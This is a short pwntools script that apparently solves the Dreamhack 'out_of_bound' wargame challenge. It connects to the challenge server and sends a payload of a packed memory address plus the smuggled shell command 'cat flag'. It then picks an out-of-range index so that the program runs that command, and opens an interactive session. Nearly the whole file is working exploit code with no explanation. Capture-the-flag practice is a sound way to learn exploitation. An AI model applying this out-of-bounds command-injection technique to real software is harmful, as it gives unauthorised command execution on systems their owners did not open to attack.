from pwn import *

#p = process('./out_of_bound')
p = remote('host3.dreamhack.games', '17115')

payload = p32(0x804a0ac+4) + b"cat flag"
p.sendlineafter("name: ", payload)
p.sendlineafter(":", b"19")
p.interactive()